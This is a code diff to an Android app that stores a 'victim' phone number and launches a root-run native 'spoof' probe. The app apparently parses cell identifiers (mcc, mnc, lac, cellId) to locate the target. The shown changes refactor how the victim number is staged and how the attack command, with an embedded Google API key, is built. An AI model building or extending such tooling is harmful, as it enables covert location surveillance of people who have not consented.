@@ -534,50 +534,23 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private suspend fun updateVictimNumber(victimNum: String): VictimUpdateResult {
         val assets = loadProbeAssets()
         val rootVictim = File(assets.workDir, "victim_list")
-        val configVictim = File(assets.configDir, "CHT/victim_list")
-        configVictim.parentFile?.mkdirs()
-
-        val appendCmd = buildString {
-            append("echo \"$victimNum\" > \"${rootVictim.absolutePath}\"; ")
-            append("echo \"$victimNum\" > \"${configVictim.absolutePath}\"")
-        }
-
-        val appendResult = runRootCommand(appendCmd)
-        val catRootResult = runRootCommand("cat \"${rootVictim.absolutePath}\"")
-        val catConfigResult = runRootCommand("cat \"${configVictim.absolutePath}\"")
+        rootVictim.writeText("$victimNum\n")
+        // Refresh the root-readable staging directory with the new app-owned input.
+        loadProbeAssets()
 
         val logText = buildString {
-            appendLine("Append command:")
-            appendLine(appendCmd)
-            appendLine("Exit code: ${appendResult.exitCode}")
-            appendLine()
-            appendLine("----- victim_list (workDir) -----")
-            appendLine(catRootResult.stdout.ifBlank { "(empty)" })
-            appendLine()
-            appendLine("----- config/CHT/victim_list -----")
-            appendLine(catConfigResult.stdout.ifBlank { "(empty)" })
-            appendLine()
-            appendLine("----- STDERR (append) -----")
-            appendLine(appendResult.stderr.ifBlank { "(empty)" })
-            appendLine()
-            appendLine("----- STDERR (cat workDir) -----")
-            appendLine(catRootResult.stderr.ifBlank { "(empty)" })
-            appendLine()
-            appendLine("----- STDERR (cat config) -----")
-            appendLine(catConfigResult.stderr.ifBlank { "(empty)" })
+            appendLine("Target number saved and staged for the native probe.")
+            appendLine("victim_list contains one configured target.")
         }
 
-        val snackbarMessage = if (appendResult.exitCode == 0) {
-            "已更新 victim_list"
-        } else {
-            "更新失敗，exit=${appendResult.exitCode}"
-        }
-
-        return VictimUpdateResult(logText = logText, snackbarMessage = snackbarMessage)
+        return VictimUpdateResult(logText = logText, snackbarMessage = "已更新 victim_list")
     }
 
     private suspend fun prepareProbeRun(title: String): PreparedProbeRun {
         val assets = loadProbeAssets()
+        if (currentVictimFromList(assets.workDir).isBlank()) {
+            throw IOException("Target number is empty. Enter it and press Set victim first.")
+        }
         val command = buildProbeCommand(assets)
         replaceLogText(buildRunHeader(title, command))
         return PreparedProbeRun(assets = assets, command = command)
@@ -806,7 +779,7 @@ mcc=${parsed.mcc}, mnc=${parsed.mnc}, lac=${parsed.lac}, cellId=${parsed.cid}
         val responseLimitArgument = sessionProgressResponseLimit
             ?.let { " --session-progress-response-limit $it" }
             .orEmpty()
-        return "cd ${assets.workDir.absolutePath} && GOOGLE_API_KEY='${BuildConfig.GOOGLE_API_KEY}' PROBE_INTERVAL_SECONDS='$probeIntervalSeconds' ./probe/spoof -r --verbose 1$responseLimitArgument"
+        return "cd ${assets.rootExecutionDir} && GOOGLE_API_KEY='${BuildConfig.GOOGLE_API_KEY}' PROBE_INTERVAL_SECONDS='$probeIntervalSeconds' ./probe/spoof -r --verbose 1$responseLimitArgument"
     }
 
     private fun buildRunHeader(title: String, command: String): String = buildString {
